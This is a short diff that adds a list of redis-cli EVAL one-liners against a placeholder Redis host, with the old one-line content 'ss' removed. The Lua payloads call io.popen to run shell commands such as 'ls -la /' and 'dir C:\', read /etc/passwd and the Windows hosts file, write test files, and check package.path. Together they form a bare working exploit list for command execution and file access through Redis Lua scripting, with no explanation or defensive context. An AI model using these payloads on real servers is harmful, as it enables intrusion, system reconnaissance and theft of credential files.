@@ -1,1 +1,12 @@
-ss
+redis-cli -h <REDIS_IP> -p <PORT> EVAL "local f = io.popen('ls -la /'); local r = f:read('*a'); f:close(); return r" 0
+
+redis-cli -h <REDIS_IP> -p <PORT> EVAL "local f = io.open('/etc/passwd', 'r'); if f then local r = f:read('*a'); f:close(); return r else return 'Cannot open file' end" 0
+
+redis-cli -h <REDIS_IP> -p <PORT> EVAL "local f = io.open('/tmp/test.txt', 'w'); f:write('Hello from Redis!'); f:close(); return 'File written successfully'" 0
+
+redis-cli -h <REDIS_IP> -p <PORT> EVAL "local f = io.popen('dir C:\\'); local r = f:read('*a'); f:close(); return r" 0
+
+redis-cli -h <REDIS_IP> -p <PORT> EVAL "local f = io.open('C:\\Windows\\System32\\drivers\\etc\\hosts', 'r'); if f then local r = f:read('*a'); f:close(); return r else return 'Cannot open file' end" 0
+redis-cli -h <REDIS_IP> -p <PORT> EVAL "local f = io.open('C:\\temp\\test.txt', 'w'); f:write('Hello from Redis!'); f:close(); return 'File written successfully'" 0
+
+redis-cli -h <REDIS_IP> -p <PORT> EVAL "return package.path" 0
